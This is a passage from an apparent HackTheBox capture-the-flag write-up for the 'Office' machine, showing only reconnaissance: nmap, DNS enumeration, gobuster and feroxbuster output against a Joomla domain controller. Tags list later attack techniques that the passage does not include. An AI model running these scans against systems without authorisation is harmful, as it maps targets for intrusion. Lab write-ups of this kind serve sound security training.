---
render_with_liquid: false
title: HackTheBox Writeup  Office
date: 2024-02-23 09:44:22 +1400
tags: [hackthebox, nmap, windows, ad, feroxbuster, joomla, cms, information-disclosure, cve-2023-23752, user-enumeration, kerbrute, netexec, password-spraying, smartbrute, smb, ldeep, brute-force-attack, python, csrf-token-bypass, 4xx-bypass, asreqroast, pcap, wireshark, network-miner, hashcat, joomla-brute, joomla2rce, php, webshell, reverse-ssh, runascs, port-forwarding, libre-office, client-side-attack, odt, cve-2023-2255, windows-credential-vault, mimikatz, dpapi, ad-gpo, sharpgpoabuse]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ pt init '10.10.11.3 office.htb DC.office.htb'
+---------+--------+------------+---------------+
| PROFILE | STATUS |     IP     |    DOMAIN     |
+---------+--------+------------+---------------+
| office  | on     | 10.10.11.3 | office.htb    |
| office  | on     | 10.10.11.3 | DC.office.htb |
+---------+--------+------------+---------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Fri Feb 23 09:44:21 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49669,49675,49678,55655,61301, office.htb
Nmap scan report for office.htb (10.10.11.3)
Host is up, received user-set (0.055s latency).
Scanned at 2024-02-23 09:44:22 CST for 104s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-robots.txt: 16 disallowed entries
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-02-23 09:44:29Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
| SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
| SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
| SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
| SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55655/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61301/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-02-23T09:45:30
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 15731/tcp): CLEAN (Timeout)
|   Check 2 (port 22439/tcp): CLEAN (Timeout)
|   Check 3 (port 52719/udp): CLEAN (Timeout)
|   Check 4 (port 40932/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 8h00m00s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Feb 23 09:46:06 2024 -- 1 IP address (1 host up) scanned in 104.96 seconds
```

## 53 - DNS

### DNS Reverse Lookup

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ dig -p 53 -x $(pt get rhost) @$(pt get rhost)
;; communications error to 10.10.11.3#53: timed out
;; communications error to 10.10.11.3#53: timed out
;; communications error to 10.10.11.3#53: timed out

; <<>> DiG 9.19.19-1-Debian <<>> -p 53 -x office.htb @office.htb
;; global options: +cmd
;; no servers could be reached
```

### DNS Zone Transfer

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ dig AXFR -p 53 @$(pt get rhost) $(pt get rhost)

; <<>> DiG 9.19.19-1-Debian <<>> AXFR -p 53 @office.htb office.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### DnsRecon Default Scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ dnsrecon -n $(pt get rhost) -d $(pt get rhost)
[*] std: Performing General Enumeration against: office.htb...
[-] DNSSEC is not configured for office.htb
[*]      SOA dc.office.htb 10.10.11.3
[*]      NS dc.office.htb 10.10.11.3
[*]      A office.htb 10.250.0.30
[*]      A office.htb 10.10.11.3
[*] Enumerating SRV Records
[+]      SRV _gc._tcp.office.htb dc.office.htb 10.10.11.3 3268
[+]      SRV _kerberos._tcp.office.htb dc.office.htb 10.10.11.3 88
[+]      SRV _kerberos._udp.office.htb dc.office.htb 10.10.11.3 88
[+]      SRV _ldap._tcp.office.htb dc.office.htb 10.10.11.3 389
[+]      SRV _ldap._tcp.ForestDNSZones.office.htb dc.office.htb 10.10.11.3 389
[+]      SRV _ldap._tcp.dc._msdcs.office.htb dc.office.htb 10.10.11.3 389
[+]      SRV _kerberos._tcp.dc._msdcs.office.htb dc.office.htb 10.10.11.3 88
[+]      SRV _kpasswd._udp.office.htb dc.office.htb 10.10.11.3 464
[+]      SRV _ldap._tcp.pdc._msdcs.office.htb dc.office.htb 10.10.11.3 389
[+]      SRV _ldap._tcp.gc._msdcs.office.htb dc.office.htb 10.10.11.3 3268
[+]      SRV _kpasswd._tcp.office.htb dc.office.htb 10.10.11.3 464
[+] 11 Records Found
```

### Subdomain Enumeration

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_subdomains.txt -t 100 -d $(pt get rhost) -r $(pt get rhost)
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     office.htb
[+] Threads:    100
[+] Resolver:   office.htb
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dc.office.htb

Found: gc._msdcs.office.htb

Found: domaindnszones.office.htb

Found: forestdnszones.office.htb

Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## 80 - HTTP : Joomla!


### Info

```ruby
http://office.htb [200] [Home] [Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28] [Apache HTTP Server:2.4.56,Joomla,OpenSSL:1.1.1t,PHP:8.0.28,Windows Server] [cda600419bd7ece17d8fb32cc6b72ea737ae6b62]
```

![](/assets/obsidian/98151e2bd31a3c42ed79f7b566bbf52f.png)

### Directory

```bash
feroxbuster -w /usr/share/dirb/wordlists/big.txt -t 100 -u "http://$(pt get rhost)" -o ferox_80_big.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ cat ferox_80_big.txt | sort | awk '$1!=404'
200      GET        0l        0w        0c http://office.htb/administrator/includes/app.php
200      GET        0l        0w        0c http://office.htb/administrator/includes/defines.php
200      GET        0l        0w        0c http://office.htb/administrator/includes/framework.php
200      GET       11l       55w     5797c http://office.htb/media/system/js/core.min.js.gz
200      GET        1l      109w     3953c http://office.htb/media/system/js/joomla-core-loader.min.js
200      GET        1l        1w     4149c http://office.htb/administrator/help/en-GB/toc.json
200      GET     2042l     7687w    62888c http://office.htb/media/system/js/highlight.js
200      GET     2149l     8221w    71443c http://office.htb/media/system/js/highlight-es5.js
200      GET        3l       76w     1304c http://office.htb/media/system/images/joomla-favicon-pinned.svg
200      GET      447l     1601w    24212c http://office.htb/
200      GET      523l     1330w    17908c http://office.htb/media/system/js/searchtools.js
301      GET        9l       30w      331c http://office.htb/api => http://office.htb/api/
301      GET        9l       30w      331c http://office.htb/tmp => http://office.htb/tmp/
301      GET        9l       30w      333c http://office.htb/cache => http://office.htb/cache/
301      GET        9l       30w      334c http://office.htb/images => http://office.htb/images/
301      GET        9l       30w      335c http://office.htb/layouts => http://office.htb/layouts/
301      GET        9l       30w      335c http://office.htb/modules => http://office.htb/modules/
301      GET        9l       30w      336c http://office.htb/includes => http://office.htb/includes/
301      GET        9l       30w      336c http://office.htb/language => http://office.htb/language/
301      GET        9l       30w      337c http://office.htb/templates => http://office.htb/templates/
